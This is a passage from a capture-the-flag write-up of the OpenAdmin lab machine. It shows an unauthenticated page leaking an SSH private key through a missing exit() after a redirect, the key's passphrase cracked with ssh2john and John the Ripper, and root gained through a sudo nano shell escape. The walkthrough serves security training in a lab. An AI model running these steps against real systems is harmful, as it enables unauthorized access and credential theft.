<h4 id="enumeration-2">Enumeration</h4>
<p>The <code>find</code> command is issued again to search files that is accessible or owned by user <code>jimmy</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jimmy@openadmin:~$ find / -type f -user jimmy 2&gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">/var/www/internal/main.php
</span></span><span class="line"><span class="cl">/var/www/internal/logout.php
</span></span><span class="line"><span class="cl">/var/www/internal/login.php
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>It successfully reveals that user <code>jimmy</code> has access to files in <code>/var/www/internal/</code>.</p>
<p>Based on apache config, <code>/var/www/internal</code> is currently hosted locally on port 52846.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
</span></span><span class="line"><span class="cl">Listen 127.0.0.1:52846
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;VirtualHost 127.0.0.1:52846&gt;
</span></span><span class="line"><span class="cl">    ServerName internal.openadmin.htb
</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/internal
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;IfModule mpm_itk_module&gt;
</span></span><span class="line"><span class="cl">AssignUserID joanna joanna
</span></span><span class="line"><span class="cl">&lt;/IfModule&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    ErrorLog <span class="si">${</span><span class="nv">APACHE_LOG_DIR</span><span class="si">}</span>/error.log
</span></span><span class="line"><span class="cl">    CustomLog <span class="si">${</span><span class="nv">APACHE_LOG_DIR</span><span class="si">}</span>/access.log combined
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/VirtualHost&gt;
</span></span></code></pre></div><h4 id="code-review---improper-redirection">Code review - Improper redirection</h4>
<p>After inspecting the <code>main.php</code> source code from <code>/var/www/internal/</code>, a logic flaw was found on the first line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jimmy@openadmin:/var/www/internal/$ cat main.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php session_start<span class="o">()</span><span class="p">;</span> <span class="k">if</span> <span class="o">(</span>!isset <span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]))</span> <span class="o">{</span> header<span class="o">(</span><span class="s2">&#34;Location: /index.php&#34;</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="c1"># Open Admin Trusted</span>
</span></span><span class="line"><span class="cl"><span class="c1"># OpenAdmin</span>
</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="o">=</span> shell_exec<span class="o">(</span><span class="s1">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&lt;pre&gt;</span><span class="nv">$output</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;h3&gt;Don<span class="err">&#39;</span>t forget your <span class="s2">&#34;ninja&#34;</span> password&lt;/h3&gt;
</span></span><span class="line"><span class="cl">Click here to <span class="nb">logout</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;logout.php&#34;</span> <span class="nv">tite</span> <span class="o">=</span> <span class="s2">&#34;Logout&#34;</span>&gt;Session
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></div><p>This line code has an improper redirection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">session_start</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /index.php&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="c1"># `die();` or `exit();` function should be called here.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="nx">SNIP</span><span class="o">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;</span><span class="si">$output</span><span class="s2">&lt;/pre&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">...&lt;SNIP&gt;...
</span></span></span></code></pre></div><p>The code above checks users&rsquo; sessions but it&rsquo;s not complete yet because the <code>die()</code> or <code>exit()</code> function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with <code>curl</code> (default without <code>-L</code> option) will prevent the page from redirection and then it renders <code>joanna</code>&rsquo;s SSH key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/ea391edd6c66409d8bb551eecdac08d5.png" alt="6b73c3ba7aa0ba3e068b85435dc8aeb1.png"  /></div>
</p>
<h4 id="password-cracking">Password cracking</h4>
<p>The private key is encrypted with a password.  <code>JtR</code> can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using <code>ssh2john.py</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class="line"><span class="cl">$ python ssh2john.py joanna_rsa &gt; joanna_rsa.hash
</span></span></code></pre></div><p>The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span> john.exe user2.txt --wordlist<span class="o">=</span>rockyou.txz
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/fa7463b8239345409a2250597b3dfa69.png" alt="ca148e3ae5b2e8b65406e0d387ca1771.png"  /></div>
</p>
<h4 id="ssh-access-1">SSH access</h4>
<p>Now I&rsquo;m able to login as user <code>joanna</code> via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class="line"><span class="cl">$ ssh -i joanna_rsa joanna@10.10.10.171
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/673cb008921d4eba886820c17fef43a0.png" alt="8f710060b1059b0ddb7cae2253e0c1ac.png"  /></div>
</p>
<p>The user flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-nano">Abusing sudo nano</h4>
<p>User <code>joanna</code> has sudo privileges on <code>/bin/nano</code></p>
<blockquote>
<p>On linux boxes, whenever you own a valid user password, always check <code>sudo -l</code> !</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">joanna@openadmin:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> joanna on openadmin:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User joanna may run the following commands on openadmin:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano /opt/priv
</span></span></code></pre></div><p>A quick way to read the root flag is by issuing the command below,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">joanna@openadmin:~$ sudo /bin/nano /opt/priv
</span></span></code></pre></div><p>and then hit <code>CTRL + R</code> to open a file, this allows us to read the root flag at  <code>/root/root.txt</code></p>
<center>
<p><div class="img-container"><img src="imgs/image-20210404121427744.png" alt="image-20210404121427744"  /></div>
</p>
</center>
<p>To gain root shell, I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> page:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">joanna@openadmin:~$ sudo /bin/nano /opt/priv <span class="c1"># Opening nano as root</span>
</span></span><span class="line"><span class="cl">^R^X <span class="c1"># CTRL+R (read/open file), CTRL+X(execute command)</span>
</span></span><span class="line"><span class="cl">reset<span class="p">;</span> sh 1&gt;<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span><span class="m">0</span> <span class="c1"># Escape from nano</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
